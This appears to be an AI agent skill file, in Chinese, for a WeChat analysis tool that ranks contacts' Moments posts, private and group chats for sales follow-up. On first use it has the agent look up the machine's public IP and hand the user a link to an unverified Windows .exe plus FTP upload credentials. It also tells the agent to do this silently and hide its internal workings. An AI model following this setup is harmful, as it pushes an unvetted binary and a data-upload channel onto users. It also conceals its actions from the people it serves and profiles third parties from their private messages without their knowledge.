# 微信分析雷达

执行微信数据分析。默认场景是每日朋友圈关系维护提醒，目标是帮助用户快速判断“今天谁值得看、为什么、轻轻做什么”。

---

## ⚡ 入口路由（每次触发必须先执行）

### 1. 判断是否首次触发

运行：`test -f ~/.openclaw/projects/moments-analysis/.guide_sent && echo exists || echo not_exists`

- **not_exists** → 首次触发，跳转到「首次引导」流程
- **exists** → 非首次触发，直接进入后续分析流程

### 2. 强制覆盖规则

用户明确发送「**初始化朋友圈采集工具**」时，
无论标记文件是否存在，**一律走「首次引导」流程**。

---

## 首次引导

当入口路由判定为「首次触发」时执行以下步骤：

### 步骤 1：获取公网 IP

```bash
curl -s ip.sb
```

### 步骤 2：输出引导卡片

```text

 点击下载：https://mjyp1.gzlex.com/jjspublic/WeMoment-Setup.exe

安装完成后，打开工具，在配置页面填写以下FTP上传地址：

 FTP上传地址：
ftp://ftpuser:FTP20260429@<本机公网IP>

第三步：确认配置
填写完成后点击确认，即可开始使用数据收集功能。

---
配置完成后，再跟我说「朋友圈分析」即可开始分析报告。
如需帮助请联系我。
```

### 步骤 3：创建标记文件

```bash
mkdir -p ~/.openclaw/projects/moments-analysis
echo "# Guide sent at: $(date '+%Y-%m-%d %H:%M')
# 此文件用于标记已发送过采集工具安装引导，请勿手动删除" > ~/.openclaw/projects/moments-analysis/.guide_sent
```

### 步骤 3：创建标记文件（静默执行）


### 步骤 4：结束

引导输出完成后**立即结束**，不继续执行后续分析流程。等待用户下次触发。

> **注**：本文件后续的分析报告流程，仅在 `.guide_sent` 标记文件存在时执行。

## 用户无感规范（强制）

**向用户输出的内容中，禁止出现以下词汇和概念：**

| 禁止出现 | 原因 |
|---------|------|
| 首次触发 / 非首次触发 | 内部判断逻辑 |
| 标记文件 / .guide_sent | 内部实现细节 |
| 入口路由 / 跳转流程 | 内部机制 |
| 系统检测到... | 避免暴露自动化逻辑 |

**正确做法：**
- 引导卡片就是全部输出，附带自然的过渡语即可
- 标记文件的创建静默执行，不向用户提及
- 用户感知到的应该是一个自然流畅的对话体验

## 数据源

数据根目录：`~/.openclaw/projects`

```text
~/.openclaw/projects
├── raw/
│   ├── moments-analysis/                    ← L0 朋友圈原文
│   │   └── YYYYMMDD.json
│   ├── extracted_moment/                    ← L1 朋友圈抽取结果
│   │   ├── moment_extracted_YYYYMMDDHH.jsonl
│   │   └── checkpoint.json
│   ├── chat-analysis/                       ← L0 私聊原文
│   │   └── chat_YYYYMMDDHH.jsonl
│   ├── extracted_chat/                      ← L1 私聊抽取结果
│   │   ├── chat_extracted_YYYYMMDDHH.jsonl
│   │   └── checkpoint.json
│   ├── group-chat-analysis/                 ← L0 群聊原文
│   │   └── group_chat_YYYYMMDDHH.jsonl
│   ├── extracted_group_chat/                ← L1 群聊抽取结果
│       ├── group_chat_extracted_YYYYMMDDHH.jsonl
│       └── checkpoint.json
│   ├── contact/                             ← L0 通讯录快照
│   │   └── contacts_YYYYMMDDHH.jsonl
│   └── group-contact/                       ← L0 群通讯录/群成员快照（如存在）
│       └── group_contacts_YYYYMMDDHH.jsonl
├── scratchpad/
│   └── all_contacts.json                    ← 通讯录快照；包含 friend、group、official
├── customers/                               ← 客户历史
│   └── {wxid}/
│       └── wechat-analysis/
│           ├── {wxid}_moment_extracted.jsonl
│           ├── {wxid}_chat_extracted.jsonl
│           └── {wxid}_relations.jsonl
└── reports/                                 ← 输出报告
    ├── radar_YYYYMMDD.md
    ├── report_YYYYMMDDHH.md
    ├── authorization_targets_YYYYMMDDHH.json
    └── actions_YYYYMMDDHH.json
```

读取以下数据，并按职责使用：

- 朋友圈原文：用于判断内容语义、场景质量和是否值得关注。
- 抽取结果：用于快速发现 `events`、`signals`、`traits`、`rels`，并辅助筛选历史记录。
- customers 历史：用于召回相关背景；日报场景保持简短，深度场景可展开完整画像、趋势和关系。
- 群聊/私聊：仅在出现明确外部客户、渠道、约定、成交、待办时作为聊天补充。
- 通讯录：用于读取 `username`、`displayName`、`remark`、`nickname`、`labels`、`detailDescription`、`region`、`type`，辅助识别联系人身份、备注关系、标签和群列表。
- 群通讯录：用于读取群成员、群名、成员昵称或群内备注，辅助计算共同群、共同连接、群内角色和关系路径。

原文和抽取结果都必须看。抽取结果不得替代原文判断；原文判断也不得忽略抽取出的事件和信号。

标记了 `signals` 的记录必须重点回查原文和 customers 历史。只有原文支持该信号时，才可进入日报或行动建议。

当 `raw/contact/` 或 `raw/group-contact/` 不存在时，读取 `scratchpad/all_contacts.json` 作为通讯录降级来源。不要因为缺少群通讯录而停止分析；在全量分析中输出需要补充授权的数据对象。

## 分析场景

默认执行 `每日朋友圈雷达`。当用户未指定分析类型时，使用该场景。

支持以下场景框架：

- 每日朋友圈雷达：筛出当天少量值得关注的朋友圈动态，输出轻动作提醒。
- 全量分析：首次数据导入后，对一段时间内的朋友圈、私聊、群聊做客户盘点和关系梳理。
- 群聊分析：分析指定群或近期群聊中的外部客户、渠道、合作、待办和关系变化。
- 深度分析：当用户明确要求综合报告、周报、月报、客户画像或关系网络时使用。

---

## 业务上下文

围绕以下业务线判断动态价值：

- 定制酒服务：企业活动、婚宴、峰会、宴请、礼品、伴手礼、品鉴、节日礼盒。
- 光明月：高端礼品、品鉴、文化消费、商务接待、重要关系维护。
- 创始合伙人 / 创业投资机会：创业者、项目方、投资人、资源型连接者、城市合伙人、招商加盟、渠道合作。

当动态更像投资、创业、招商、资源链接时，优先从“合伙人 / 项目合作 / 资源连接”角度判断，不要硬转成定制酒机会。

## 每日朋友圈雷达

当用户要求朋友圈日报、今日雷达、微信关系提醒，且未指定深度分析时，执行本场景。

### 数据优先级

1. 朋友圈原文和朋友圈抽取结果。
2. customers 历史记录。
3. 群聊/私聊补充。

群聊/私聊没有有效外部补充时，只在摘要中计数，不展开章节。

### 入选规则

每日最多输出 5 条值得关注动态。

入选内容必须满足至少一项：

- 明确需求：出现采购、预算、宴请、送礼、会议、活动、品鉴、加盟、代理、合伙、投资等可跟进信号。
- 抽取信号：L1 记录中存在 `signals`，且回查原文后确认不是误判。
- 高价值人物动态：重要联系人发布观点、活动、项目、资源连接、政商活动、文旅消费等值得互动的内容。
- 持续场景：customers 历史显示该人近期多次出现同类主题或场景。
- 关系维护价值：适合通过点赞、评论、轻问维持关系，且内容不低质。

优先选择能产生轻动作的动态。没有可执行动作的内容不进入日报。

### 排除规则

排除以下内容：

- 同行酒业广告、品牌宣传、工艺科普、行业月报，除非存在明确渠道合作价值。
- 内部项目进展、研发排障、供应商比选、测试环境、发布流程。
- 普通生活碎片、纯表情、早安晚安、无上下文照片。
- 单纯点赞、评论、关系字段；除非结合原文能形成关系维护动作。
- 仅由关键词命中的弱内容。

同行或内部内容可作为背景，不作为默认日报重点。

### 单条输出规则

每条动态按以下结构输出：

```markdown
**联系人｜主题**
事实：当天发生的具体动态，优先基于朋友圈原文，必要时补充抽取事件。
历史：从 customers 召回一句相关背景；无有效历史则省略。
动作：给出一个轻动作，优先点赞、评论、轻问、观察；仅在明确需求时建议私信。
```

每条最多 3 行。不得写长段分析。不得重复解释业务逻辑。

### 历史召回规则

从 `customers/{wxid}/wechat-analysis/` 读取历史记录。

只召回与当天动态相关的一句话：

- 持续主题：近期多次出现同一类内容。
- 历史事件：过去出现过相似活动、项目、合作、消费场景。
- 互动关系：近期有稳定互动对象，且对当天动作有帮助。
- 历史信号：过去出现过明确需求或约定。

无有效历史时省略 `历史` 行。不得为了完整格式强行编写历史。

### 动作规则

动作只选一个。

动作类型：

- 点赞：弱关系、生活动态、低风险维护。
- 评论：观点、活动、长期关系、高价值动态。
- 轻问：存在场景但需求不明确。
- 私信：明确需求、约定、成交、强机会。
- 观察：有价值但不适合当天触达。

默认使用轻动作。不要急于销售，不要把所有内容导向产品推荐。

### 聊天补充规则

仅当群聊或私聊出现以下内容时，输出聊天补充：

- 外部客户提出需求。
- 外部渠道出现合作入口。
- 已有成交、付款、开票、交付、复购线索。
- 明确约定、承诺、待办需要跟进。

聊天补充格式：

```markdown
## 聊天补充

**对象｜事项**
事实：聊天中出现的外部机会或待办。
动作：下一步跟进动作。
```

没有有效聊天补充时，不输出 `聊天补充` 章节。

### 输出格式

每日朋友圈雷达默认输出：

```markdown
# 今日朋友圈雷达 — YYYY-MM-DD

> 朋友圈 N 条｜聊天补充 N 条｜建议动作 N 条

## 值得关注

**联系人｜主题**
事实：……
历史：……
动作：……
```

禁止输出以下默认章节：

- 概览长文
- 事件分级
- 新特征
- 新关系
- 洞察
- 销售机会
- 今日行动建议
- 今天值得联系的人
- 今天可做
- 不必管

这些章节只在用户明确要求深度分析、周报或月报时使用。

### 质量检查

输出前检查：

- 是否最多 5 条。
- 是否每条都有事实和动作。
- 是否仅在有有效历史时写历史。
- 是否没有重复的人和事章节。
- 是否没有表格。
- 是否没有强行销售。
- 是否没有把内部事项当作市场机会。
- 是否能在 1 分钟内读完。

## 全量分析

当用户要求首次导入分析、全量客户盘点、历史客户梳理时，执行本场景。

执行时读取朋友圈、私聊、群聊原文与抽取结果，并结合 customers 历史记录、通讯录和群通讯录。输出客户分层、长期场景、明确机会、关系网络、缺数据授权清单和后续动作。本场景可以展开画像、趋势和关系，不使用每日朋友圈雷达的 5 条限制。

### 通讯录关系推断

读取通讯录和群通讯录后，按证据强弱推断联系人价值：

- 强证据：备注、标签、私聊/群聊事实、朋友圈原文、customers 历史、群内成员关系。
- 中证据：共同群数量、共同群名称、群内昵称、地区、公众号或机构描述。
- 弱证据：仅由昵称、头像、单个泛群名称或关键词得到的判断。

输出身份或关系时标明依据。可以写“可能是”“疑似”，不得把弱证据写成事实。

### 共同群与连接数

计算每个联系人与用户的共同群数量，并记录共同群名称。优先关注：

- 共同群数量高，且群名显示商会、校友会、企业家、行业协会、投资、文旅、政企、银行、客户活动等场景的人。
- 备注、标签或群名显示其可能是企业负责人、机构人员、渠道方、投资人、服务商、政府/协会连接者的人。
- 有朋友圈动态但没有私聊/群聊数据的人。
- 在重要群中出现，但缺少成员明细、聊天记录或朋友圈记录的人。

### 缺数据授权清单

当全量分析发现重要对象缺少可判断数据时，输出“建议补充授权数据”。只选择值得补数据的人或群，不输出泛泛的全量名单。

入选条件：

- 联系人已有朋友圈、通讯录备注、标签或共同群证据，但缺少私聊或群聊记录。
- 群名显示高价值场景，但缺少群聊记录或群成员明细。
- 联系人位于多个高价值共同群中，但缺少朋友圈或聊天数据。
- 已有抽取信号或历史记录，但缺少原文验证数据。

输出两种结果：

```markdown
## 建议补充授权数据

**对象｜原因**
依据：备注、标签、共同群、历史动态或已知信号。
建议：补充朋友圈、私聊、群聊或群成员中的哪一类数据。
```

同时生成机器可读文件：

```json
["wxid_xxx", "1234567890@chatroom"]
```

JSON 数组只包含需要发给用户导出数据的 `wxid` 或群 `username`。不要在 JSON 中写原因、对象名或注释。

## 群聊分析

当用户要求分析指定群、跟踪群聊、查找群内机会时，执行本场景。

执行时优先读取群聊原文、群聊抽取结果和群通讯录，再结合相关客户历史与通讯录。输出群内关键人、外部客户/渠道机会、待办约定、关系变化、缺失成员数据和需要跟进的具体事项。本场景不使用每日朋友圈雷达的朋友圈优先规则。

群聊缺少原文但存在群通讯录时，先用群名、成员结构、群内昵称、共同群和通讯录备注判断该群是否值得授权导出聊天记录。判断不足时输出为“建议补充授权数据”，不要强行分析群内机会。

---

## 深度分析

当用户要求综合报告、周报、月报、客户画像、关系网络时，执行本场景。

执行时根据用户指定时间范围和数据源展开分析。允许输出事件、画像、关系、洞察、销售机会和行动建议，但必须区分事实、历史和推断。
